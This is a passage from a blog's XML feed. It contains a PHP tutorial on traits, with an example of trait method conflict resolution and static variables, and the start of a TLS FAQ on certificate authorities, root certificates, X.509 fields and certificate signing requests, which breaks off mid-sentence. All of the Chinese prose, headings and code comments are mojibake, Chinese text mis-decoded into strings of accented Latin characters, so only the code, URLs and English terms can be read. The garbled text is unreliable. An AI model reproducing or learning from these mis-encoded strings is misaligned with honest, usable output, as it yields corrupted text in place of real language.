Xdebug</a></li><li><a href="https://learnku.com/articles/32746" target="_blank" rel="noopener">åœ¨ Laradock ä¸­ä½¿ç”¨ Xdebug</a></li><li><a href="https://learnku.com/articles/24389" target="_blank" rel="noopener">Laradock ä½¿ç”¨ PhpStorm Debug ä»£ç </a></li><li><a href="https://www.qiancheng.me/post/coding/show-linux-issue-version" target="_blank" rel="noopener">å¦‚ä½•æŸ¥çœ‹ LINUX å‘è¡Œç‰ˆçš„åç§°åŠå…¶ç‰ˆæœ¬å·</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆ PHP ä¸­çš„ Trait å…³é”®å­—</title>
      <link href="/post/%E6%B5%85%E8%B0%88%20PHP%20%E4%B8%AD%E7%9A%84%20Trait%20%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/post/%E6%B5%85%E8%B0%88%20PHP%20%E4%B8%AD%E7%9A%84%20Trait%20%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/00831rSTly1gchl4dov84j31hc0u0grs.jpg" alt=""></p><a id="more"></a><p>ç”±äº PHP æ˜¯å•ç»§æ‰¿è¯­è¨€ï¼Œå› æ­¤ä½¿ç”¨ trait æ¥å®ç°äº†ç±»ä¼¼å¤šç»§æ‰¿çš„ä»£ç å¤ç”¨ï¼Œä¸€ä¸ª trait å’Œä¸€ä¸ªç±»ç›¸ä¼¼ï¼Œä½† trait ä¸èƒ½åƒç±»ä¸€ä¸ªå®ä¾‹åŒ–ï¼Œè€Œæ˜¯é€šè¿‡å…³é”®å­—<code>use</code>æ·»åŠ åˆ°å…¶å®ƒç±»çš„å†…éƒ¨ï¼Œç›¸æ¯”äºä¼ ç»Ÿç»§æ‰¿æ–¹æ³•ï¼Œtrait å¢åŠ äº†æ°´å¹³ç‰¹æ€§çš„ç»„åˆã€‚</p><p>å¼•å…¥äº† trait ç±»çš„è°ƒç”¨é¡ºåºä¾æ¬¡ä¸ºï¼šå½“å‰ç±» ==&gt; trait ==&gt; çˆ¶ç±»ã€‚</p><p>åœ¨ trait ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æŠ½è±¡æ–¹æ³•ã€é™æ€å˜é‡ä¸é™æ€æ–¹æ³•ï¼Œåœ¨ trait ä¸­åŒæ ·å¯ä»¥å®šä¹‰å±æ€§ã€‚</p><p>å¦‚æœåœ¨å¼•å…¥çš„ä¸åŒ trait ä¸­åŒ…å«äº†åŒåæ–¹æ³•ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>insteadof</code> å…³é”®å­—æˆ–<code>as</code>å…³é”®å­—æ¥é¿å…å†²çªï¼Œå‰è€…æ˜¯å£°æ˜æ’é™¤æ‰å…¶å®ƒæ–¹æ³•ï¼Œåè€…åˆ™æ˜¯å¯¹å†²çªçš„æ–¹æ³•åé‡å‘½åï¼Œä¸å‘½åç©ºé—´ä¸­çš„<code>as</code>ä½œç”¨ç›¸åŒï¼Œå»ºè®®ä½¿ç”¨<code>as</code>å…³é”®å­—ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'method hello from class Base'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Hello</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'method hello from Trait Hello!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hi</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'method hi from Trait Hello!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticMethod</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'static method staticMethod from Trait Hello!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $value;</span><br><span class="line">        $value++;</span><br><span class="line">        <span class="keyword">echo</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Hi</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'method hello from Trait Hi!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'method hi from Trait Hi!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> HelloHi</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">Hi</span> &#123;</span><br><span class="line">        <span class="title">Hello</span>::<span class="title">hello</span> <span class="title">insteadOf</span> <span class="title">Hi</span>; <span class="comment">// æ³¨æ„æ˜¯ insteadOf å…³é”®å­—ï¼Œä¸æ˜¯ instanceofï¼Œå®³æˆ‘çº³é—·å„¿äº†åŠå¤©</span></span><br><span class="line">        Hi::hi <span class="keyword">insteadOf</span> Hello;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNew</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HelloHi</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $value = <span class="string">'class MyNew'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyNew();</span><br><span class="line">$obj-&gt;hello(); <span class="comment">// method hello from Trait Hello!</span></span><br><span class="line">$obj-&gt;hi(); <span class="comment">// method hi from Trait Hi!</span></span><br><span class="line">MyNew::staticMethod(); <span class="comment">// static method staticMethod from Trait Hello!</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;getValue(); <span class="comment">// class MyNew</span></span><br><span class="line">$objOther = <span class="keyword">new</span> MyNew();</span><br><span class="line">$obj-&gt;staticValue();  <span class="comment">// 1</span></span><br><span class="line">$objOther-&gt;staticValue(); <span class="comment">// 2ï¼Œå› ä¸º $value æ˜¯é™æ€å˜é‡ï¼Œæ‰€ä»¥ç»“æœä¼šè¿›è¡Œç´¯åŠ </span></span><br></pre></td></tr></table></figure><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://www.php.net/manual/zh/language.oop5.traits.php" target="_blank" rel="noopener">Trait - PHP Manual</a></li><li>Laravel æ¡†æ¶å…³é”®æŠ€æœ¯è§£æ 3.6 èŠ‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç©è½¬TLSç³»åˆ—ä¹‹ä¸€ã€‘FAQ</title>
      <link href="/post/play-with-https/"/>
      <url>/post/play-with-https/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87bjl942qj30pg0dwgn0.jpg" alt=""></p><blockquote><p>ç†è§£ä¸€ä¸ªé—®é¢˜ä¸è®²æ˜ç™½ä¸€ä¸ªé—®é¢˜å“ªä¸ªæ›´å›°éš¾ï¼Ÿ</p></blockquote><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯-CA-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-CA-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ CA ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ CA ï¼Ÿ</h2><p>CA(Certificate Authority) æ˜¯è¯ä¹¦çš„ç­¾å‘æœºæ„ï¼Œå®ƒæ˜¯ PKI(Public key infrastructureï¼Œå…¬é’¥åŸºç¡€è®¾æ–½) çš„æ ¸å¿ƒã€‚CA æ˜¯è´Ÿè´£ç­¾å‘è¯ä¹¦ã€è®¤è¯è¯ä¹¦ã€ç®¡ç†å·²é¢å‘è¯ä¹¦çš„æœºå…³ã€‚å®ƒè¦åˆ¶å®šæ”¿ç­–å’Œå…·ä½“æ­¥éª¤æ¥éªŒè¯ã€è¯†åˆ«ç”¨æˆ·èº«ä»½ï¼Œå¹¶å¯¹ç”¨æˆ·è¯ä¹¦è¿›è¡Œç­¾åï¼Œä»¥ç¡®ä¿è¯ä¹¦æŒæœ‰è€…çš„èº«ä»½å’Œå…¬é’¥çš„æ‹¥æœ‰æƒã€‚</p><p>å¸¸è§çš„ CA æœºæ„æœ‰ Letâ€™s Encryptã€CAcert.orgã€Comodoã€DigiCertã€GlobalSignã€Verisignç­‰ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯æ ¹è¯ä¹¦ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ ¹è¯ä¹¦ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ¹è¯ä¹¦ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ ¹è¯ä¹¦ï¼Ÿ</h2><p>æ ¹è¯ä¹¦ï¼ˆroot certificateï¼‰æ˜¯å±äºæ ¹è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰çš„å…¬é’¥è¯ä¹¦ï¼Œæ˜¯åœ¨å…¬å¼€é‡‘é’¥åŸºç¡€å»ºè®¾ä¸­ï¼Œä¿¡ä»»é“¾çš„èµ·ç‚¹ã€‚ä»»ä½•äººéƒ½å¯ä»¥å¾—åˆ° CA çš„è¯ä¹¦ï¼ˆå«å…¬é’¥ï¼‰ï¼Œç”¨ä»¥éªŒè¯å®ƒæ‰€ç­¾å‘çš„è¯ä¹¦ã€‚</p><p>è¯ä¹¦é“¾æ˜¯å½¢æˆä¸€ä¸ªä»¥å…¶æ ¹è¯ä¹¦ä¸ºé¡¶å±‚çš„æ ‘çŠ¶ç»“æ„ï¼Œé€šè¿‡æ ¹è¯ä¹¦ä¸ä¸­é—´è¯ä¹¦ï¼ˆæ ‘å¹²ï¼‰å¯ä»¥ä¸ºç½‘ç«™ç­¾å‘æ— æ•°çš„å¶è¯ä¹¦ï¼ˆæ ‘å¶ï¼‰ï¼Œæˆ‘ä»¬çš„ç”µè„‘åªéœ€é¢„è£…æœ‰é™çš„æ ¹è¯ä¹¦ï¼Œå°±å¯ä»¥è¾¨åˆ«æ— æ•°ç½‘ç«™çš„è¯ä¹¦æ˜¯å¦ç”±å¯ä¿¡æ ¹è¯ä¹¦ç­¾å‘ï¼Œä»è€ŒéªŒè¯å®‰å…¨æ€§ã€‚</p><h2 id="æ ¹è¯ä¹¦æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"><a href="#æ ¹è¯ä¹¦æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title="æ ¹è¯ä¹¦æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"></a>æ ¹è¯ä¹¦æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ</h2><p>é’¥åŒ™å…¸ç¤¼ï¼šå‡­è¯æœºæ„è‡ªç­¾ä¸€å¼ æ–°çš„æ ¹å‡­è¯æ—¶ï¼Œéœ€è¦äº§ç”Ÿä¸€å¯¹å…¬å¼€é‡‘é’¥åŠç§æœ‰å¯†é’¥ï¼Œè¿™ä¸ªè¿‡ç¨‹åœ¨å…¬è¯äººã€å¾‹å¸ˆåŠå½•å½±ç³»ç»Ÿç›‘å¯Ÿä¸‹ç»è¿‡ä¸€ç³»åˆ—ä¸¥è°¨çš„ç¨‹åºï¼Œåœ¨é«˜åº¦é˜²æŠ¤çš„è®¾æ–½å†…è¿›è¡Œã€‚</p><p>æ ¹è¯ä¹¦ä½œä¸ºè‡ªç­¾è¯ä¹¦ï¼Œä½†æ˜¯è·å¾—å¹¿æ³›è®¤å¯ï¼Œé€šå¸¸å·²é¢„å…ˆå®‰è£…åœ¨å„ç§è½¯ä»¶ï¼ˆåŒ…æ‹¬æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ã€ç”µé‚®è½¯ä»¶ç­‰ï¼‰ï¼Œä½œä¸ºä¿¡ä»»é“¾çš„èµ·ç‚¹ï¼Œæ¥è‡ªäºå…¬è®¤å¯é çš„æ”¿åºœæœºå…³ï¼ˆå¦‚é¦™æ¸¯é‚®æ”¿ï¼‰ã€è½¯ä»¶å…¬å¸ï¼ˆå¦‚ Googleã€Letâ€™s Encryptï¼‰ç­‰ï¼Œä¸å„å¤§è½¯ä»¶å•†é€è¿‡ä¸¥è°¨çš„æ ¸è®¤ç¨‹åºæ‰åœ¨ä¸åŒçš„è½¯ä»¶å¹¿æ³›éƒ¨ç½²ã€‚ç”±äºéƒ¨ç½²ç¨‹åºå¤æ‚è´¹æ—¶ï¼Œéœ€è¦è¡Œæ”¿äººå‘˜çš„æˆæƒåŠæœºæ„æ³•äººèº«ä»½çš„æ ¸è®¤ï¼Œä¸€å¼ æ ¹è¯ä¹¦æœ‰æ•ˆæœŸå¯èƒ½é•¿è¾¾åå¹´ä»¥ä¸Šã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ Mac ä¸­çš„ Keychain Access ä¸­æŸ¥åˆ°è¿™äº›å†…ç½®æ ¹è¯ä¹¦ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gam0v5hlm3j314k0puk12.jpg" alt=""></p><p>ç”±äºæ ¹å‡­è¯åœ¨ä¿¡ä»»é“¾ä¸­çš„é‡è¦è§’è‰²ï¼Œ<strong>ä¸€æ—¦å‡­è¯æœºæ„çš„ç§é’¥å¤–æ³„ï¼Œå°†å¯èƒ½å¯¼è‡´æ•´ä¸ªä¿¡ä»»é“¾è¢«æ‘§æ¯</strong>ï¼Œå½±å“å¹¿åŠä¼—å¤šå®¢æˆ·ï¼Œæ‰€ä»¥è®¤è¯æœºæ„ä¼šä½¿ç”¨å„ç§æ–¹æ³•ä¿æŠ¤æ ¹å‡­è¯ï¼Œä¾‹å¦‚ç¡¬ä»¶å®‰å…¨æ¨¡ç»„ã€‚æœ‰äº›å‚¨å­˜ç§é’¥çš„ç”µè„‘ç”šè‡³å¹³æ—¶ä¸ä¼šè¿çº¿ï¼Œåªåœ¨å›ºå®šçš„å®‰æ’ä¸‹ï¼Œç»è¿‡ä¸€ç³»åˆ—ä¸¥è°¨çš„è¡Œæ”¿æµç¨‹é‡é‡æŠŠå…³ï¼Œæ‰ä¼šå–å‡ºç§é’¥ä¸ºå®¢æˆ·ç­¾ç« å‡­è¯ã€‚åœ¨ä¿¡ä»»é“¾è®¾è®¡ä¸­ï¼Œç»å¤§éƒ¨ä»½çš„æ ¹å‡­è¯éƒ½ä¸ä¼šç›´æ¥ä¸ºå®¢æˆ·ç­¾ç« ï¼Œè€Œæ˜¯å…ˆç­¾ç« ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰ä¸­ç»§å‡­è¯ï¼Œå†ç”±ä¸­ç»§å‡­è¯ä¸ºå®¢æˆ·ç­¾ç« ï¼Œè¿™å¯ä»¥åŠ å¼ºæ§ç®¡èƒ½åŠ›åŠæ§åˆ¶ä¸€æ—¦ç­¾ç« ç§é’¥è¢«æ³„æ—¶çš„æŸå¤±ã€‚</p><h2 id="è¯ä¹¦ä¸­éƒ½åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ"><a href="#è¯ä¹¦ä¸­éƒ½åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ" class="headerlink" title="è¯ä¹¦ä¸­éƒ½åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ"></a>è¯ä¹¦ä¸­éƒ½åŒ…å«å“ªäº›ä¿¡æ¯ï¼Ÿ</h2><p>è¯ä¹¦éœ€è¦ä¿è¯ç”¨æˆ·ä¹‹é—´åœ¨ç½‘ä¸Šä¼ é€’ä¿¡æ¯çš„å®‰å…¨æ€§ã€çœŸå®æ€§ã€å¯é æ€§ã€å®Œæ•´æ€§å’Œä¸å¯æŠµèµ–æ€§ã€‚<br>è¯ä¹¦çš„å†…å®¹åŒ…æ‹¬ï¼šç”µå­ç­¾è¯æœºå…³çš„ä¿¡æ¯ã€å…¬é’¥ç”¨æˆ·ä¿¡æ¯ã€å…¬é’¥ã€æƒå¨æœºæ„çš„ç­¾å­—å’Œæœ‰æ•ˆæœŸç­‰ç­‰ã€‚ç›®å‰ï¼Œè¯ä¹¦çš„æ ¼å¼å’ŒéªŒè¯æ–¹æ³•æ™®ééµå¾ª <a href="https://zh.wikipedia.org/wiki/X.509" target="_blank" rel="noopener">X.509</a> å›½é™…æ ‡å‡†ï¼Œå…¶å†…å®¹æ ¼å¼å¦‚ä¸‹</p><ul><li>ç‰ˆæœ¬ï¼šç°è¡Œé€šç”¨ç‰ˆæœ¬æ˜¯ V3</li><li>åºå·ï¼šç”¨ä»¥è¾¨è¯†æ¯ä¸€å¼ å‡­è¯ï¼Œç‰¹åˆ«åœ¨æ’¤æ¶ˆå‡­è¯çš„æ—¶å€™æœ‰ç”¨</li><li>ä¸»ä½“ï¼šæ‹¥æœ‰æ­¤å‡­è¯çš„æ³•äººæˆ–è‡ªç„¶äººèº«ä»½æˆ–æœºå™¨ï¼ŒåŒ…æ‹¬ï¼š<ul><li>å›½å®¶ï¼ˆCï¼ŒCountryï¼‰</li><li>å· / çœï¼ˆSï¼ŒStateï¼‰</li><li>åœ°åŸŸ / åŸå¸‚ï¼ˆLï¼ŒLocationï¼‰</li><li>ç»„ç»‡ / å•ä½ï¼ˆOï¼ŒOrganizationï¼‰</li><li>é€šç”¨åç§° ï¼ˆCNï¼ŒCommon Nameï¼‰ï¼šåœ¨ TLS åº”ç”¨ä¸Šï¼Œæ­¤æ ä½ä¸€èˆ¬æ˜¯ ç½‘åŸŸ</li></ul></li><li>å‘è¡Œè€…ï¼šä»¥æ•°ä½ç­¾ç« å½¢å¼ç­¾ç½²æ­¤å‡­è¯çš„æ•°å­—è¯ä¹¦è®¤è¯æœºæ„</li><li>æœ‰æ•ˆæœŸå¼€å§‹æ—¶é—´ï¼šæ­¤å‡­è¯çš„æœ‰æ•ˆå¼€å§‹æ—¶é—´ï¼Œåœ¨æ­¤å‰è¯¥å‡­è¯å¹¶æœªç”Ÿæ•ˆ</li><li>æœ‰æ•ˆæœŸç»“æŸæ—¶é—´ï¼šæ­¤å‡­è¯çš„æœ‰æ•ˆç»“æŸæ—¶é—´ï¼Œåœ¨æ­¤åè¯¥å‡­è¯ä½œåºŸ</li><li>å…¬é’¥ç”¨é€”ï¼šæŒ‡å®šå‡­è¯ä¸Šå…¬é’¥çš„ç”¨é€”ï¼Œä¾‹å¦‚æ•°å­—ç­¾åã€æœåŠ¡å™¨éªŒè¯ã€ç”¨æˆ·ç«¯éªŒè¯ç­‰</li><li>å…¬é’¥</li><li>å…¬é’¥æŒ‡çº¹</li><li>æ•°ä½ç­¾ç« </li><li>æ•°ä½ç­¾ç« æ¼”ç®—æ³•</li><li>ä¸»ä½“åˆ«åï¼šä¾‹å¦‚ä¸€ä¸ªç½‘ç«™å¯èƒ½ä¼šæœ‰å¤šä¸ªç½‘åŸŸï¼ˆ<a href="http://www.wikipedia.org" target="_blank" rel="noopener">www.wikipedia.org</a>, zh.wikipedia.org, zh.m.wikipedia.org éƒ½æ˜¯ç»´åŸºç™¾ç§‘ï¼‰ã€ä¸€ä¸ªç»„ç»‡å¯èƒ½ä¼šæœ‰å¤šä¸ªç½‘ç«™ï¼ˆ*.wikipedia.org, *.wikibooks.org, *.wikidata.org éƒ½æ˜¯ç»´åŸºåª’ä½“åŸºé‡‘ä¼šæ——ä¸‹çš„ç½‘åŸŸï¼‰ï¼Œä¸åŒçš„ç½‘åŸŸå¯ä»¥ä¸€å¹¶ä½¿ç”¨åŒä¸€å¼ å‡­è¯ï¼Œæ–¹ä¾¿å®ä½œåº”ç”¨åŠç®¡ç†<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gam15g7wd7j30qw0py47a.jpg" alt="Wikipedia Cert"></li></ul><h2 id="ä¸ºä»€ä¹ˆè¯ä¹¦ä¸­çš„åŠ å¯†ç®—æ³•ç»å¸¸æ˜¯ECDSA-with-SHA-512ï¼Œè€Œä¸æ˜¯å•ä¸€ç®—æ³•ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¯ä¹¦ä¸­çš„åŠ å¯†ç®—æ³•ç»å¸¸æ˜¯ECDSA-with-SHA-512ï¼Œè€Œä¸æ˜¯å•ä¸€ç®—æ³•ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¯ä¹¦ä¸­çš„åŠ å¯†ç®—æ³•ç»å¸¸æ˜¯ECDSA with SHA-512ï¼Œè€Œä¸æ˜¯å•ä¸€ç®—æ³•ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¯ä¹¦ä¸­çš„åŠ å¯†ç®—æ³•ç»å¸¸æ˜¯<code>ECDSA with SHA-512</code>ï¼Œè€Œä¸æ˜¯å•ä¸€ç®—æ³•ï¼Ÿ</h2><p>é€šå¸¸æˆ‘ä»¬å…ˆå¯¹æ¶ˆæ¯è¿›è¡Œå“ˆå¸Œï¼Œå¾—åˆ°ä¸€ä¸ªæ¶ˆæ¯æ‘˜è¦ï¼Œç„¶åå†ç”¨ç§é’¥å¯¹è¯¥æ‘˜è¦è¿›è¡Œç­¾åï¼Œæˆ‘ä»¬é€šè¿‡å…¬é’¥å¯¹è¯¥æ¶ˆæ¯æ‘˜è¦çš„ç­¾åéªŒè¯å³å¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„éå¯¹ç§°åŠ å¯†æ˜¯<code>ECDSA with SHA-512</code></p><h2 id="è¯ä¹¦çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è¯ä¹¦çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è¯ä¹¦çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"></a>è¯ä¹¦çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>ä½¿ç”¨æ•°å­—è¯ä¹¦å®ç°èº«ä»½è¯†åˆ«å’Œç”µå­ä¿¡æ¯åŠ å¯†ã€‚æ•°å­—è¯ä¹¦ä¸­å«æœ‰å¯†é’¥å¯¹ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰æ‰€æœ‰è€…çš„è¯†åˆ«ä¿¡æ¯ï¼Œé€šè¿‡éªŒè¯è¯†åˆ«ä¿¡æ¯çš„çœŸä¼ªå®ç°å¯¹è¯ä¹¦æŒæœ‰è€…èº«ä»½çš„è®¤è¯ã€‚</p><h2 id="CA-ç»™è®¤è¯è€…é¢å‘äº†ä»€ä¹ˆï¼Ÿå…¬é’¥ï¼Ÿç§é’¥ï¼Ÿè¿˜æ˜¯ç­¾åï¼Ÿ"><a href="#CA-ç»™è®¤è¯è€…é¢å‘äº†ä»€ä¹ˆï¼Ÿå…¬é’¥ï¼Ÿç§é’¥ï¼Ÿè¿˜æ˜¯ç­¾åï¼Ÿ" class="headerlink" title="CA ç»™è®¤è¯è€…é¢å‘äº†ä»€ä¹ˆï¼Ÿå…¬é’¥ï¼Ÿç§é’¥ï¼Ÿè¿˜æ˜¯ç­¾åï¼Ÿ"></a>CA ç»™è®¤è¯è€…é¢å‘äº†ä»€ä¹ˆï¼Ÿå…¬é’¥ï¼Ÿç§é’¥ï¼Ÿè¿˜æ˜¯ç­¾åï¼Ÿ</h2><p>ç”¨æˆ·è‹¥æ¬²å–å¾—è¯ä¹¦ï¼Œåº”å…ˆå‘ CA æå‡ºç”³è¯·ï¼ŒCA åˆ¤æ˜ç”³è¯·è€…çš„èº«ä»½åï¼Œä¸ºä¹‹åˆ†é…ä¸€ä¸ªå…¬é’¥ï¼Œå¹¶å°†è¯¥å…¬é’¥ä¸å…¶èº«ä»½ä¿¡æ¯ç»‘å®šï¼Œä¸ºè¯¥æ•´ä½“ç­¾å­—ï¼Œç­¾å­—åçš„æ•´ä½“å³ä¸ºè¯ä¹¦ï¼Œå‘è¿˜ç»™ç”³è¯·è€…ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼ŒCA ç”¨è‡ªå·±çš„ç§é’¥å¯¹éœ€è¦è®¤è¯çš„äººï¼ˆæˆ–ç»„ç»‡æœºæ„ï¼‰çš„å…¬é’¥æ–½åŠ æ•°å­—ç­¾åå¹¶ç”Ÿæˆè¯ä¹¦ï¼Œå³è¯ä¹¦çš„æœ¬è´¨å°±æ˜¯å¯¹å…¬é’¥æ–½åŠ æ•°å­—ç­¾åã€‚</p><h2 id="å‘-CA-ç”³é¢†è¯ä¹¦çš„æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ"><a href="#å‘-CA-ç”³é¢†è¯ä¹¦çš„æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ" class="headerlink" title="å‘ CA ç”³é¢†è¯ä¹¦çš„æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ"></a>å‘ CA ç”³é¢†è¯ä¹¦çš„æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ</h2><p>è¯ä¹¦ç”³é¢†çš„å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ›å»ºå…¬ç§é’¥</li><li>åˆ›å»º CSRï¼Œå…¶ä¸­éœ€è¦åŒ…å«åŸŸåä¸å…¬é’¥ï¼Œå¹¶ç”¨ç§é’¥ç­¾å</li><li>å‘é€ CSR è‡³ CA </li><li>CA é€šè¿‡æ£€æŸ¥DNSï¼Œæ£€æŸ¥é»„é¡µï¼Œæ‰“ç”µè¯ç­‰æ–¹å¼éªŒè¯ CSR ä¸­çš„æ˜¯å¦çœŸå®</li><li>å¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™ CA ç­¾å‘è¯ä¹¦</li></ol><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>6. é²ä¼¯åœ¨è‡ªå·±çš„æœºå™¨ä¸Šä½¿ç”¨å¯†ç 